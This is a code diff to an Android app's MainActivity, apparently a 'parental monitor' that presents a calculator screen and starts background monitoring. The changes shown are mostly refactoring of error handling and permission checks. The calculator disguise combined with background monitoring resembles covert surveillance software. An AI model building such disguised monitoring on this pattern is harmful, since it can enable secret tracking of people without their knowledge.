@@ -18,9 +18,6 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var preferencesManager: PreferencesManager
 
-    private val requiredPermissions: Array<String>
-        get() = com.redeye.parentalmonitor.utils.AppPermissions.requiredPermissions
-
     override fun onSaveInstanceState(outState: Bundle) {
         super.onSaveInstanceState(outState)
         outState.putString("currentNumber", currentNumber)
@@ -37,10 +34,7 @@ class MainActivity : AppCompatActivity() {
         preferencesManager = PreferencesManager.getInstance(this)
 
         setContentView(R.layout.activity_calculator)
-        try {
-            supportActionBar?.hide()
-        } catch (_: Exception) {
-        }
+        supportActionBar?.hide()
         initCalculator()
         if (savedInstanceState != null) {
             currentNumber = savedInstanceState.getString("currentNumber", "")
@@ -61,14 +55,11 @@ class MainActivity : AppCompatActivity() {
                     preferencesManager = PreferencesManager.getInstance(appCtx)
                 } catch (_: Exception) {
                 }
-                try {
-                    runOnUiThread {
-                        try {
-                            if (!isFinishing && !isDestroyed) startMonitoringInBackground()
-                        } catch (_: Exception) {
-                        }
+                runOnUiThread {
+                    try {
+                        if (!isFinishing && !isDestroyed) startMonitoringInBackground()
+                    } catch (_: Exception) {
                     }
-                } catch (_: Exception) {
                 }
             }
         } catch (_: Exception) {
@@ -321,9 +312,7 @@ class MainActivity : AppCompatActivity() {
     }
     
     private fun hasAllPermissions(): Boolean {
-        return requiredPermissions.filter { it != Manifest.permission.POST_NOTIFICATIONS }.all { permission ->
-            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
-        }
+        return com.redeye.parentalmonitor.utils.AppPermissions.hasAll(this)
     }
 
     private fun hasBackgroundLocation(): Boolean {
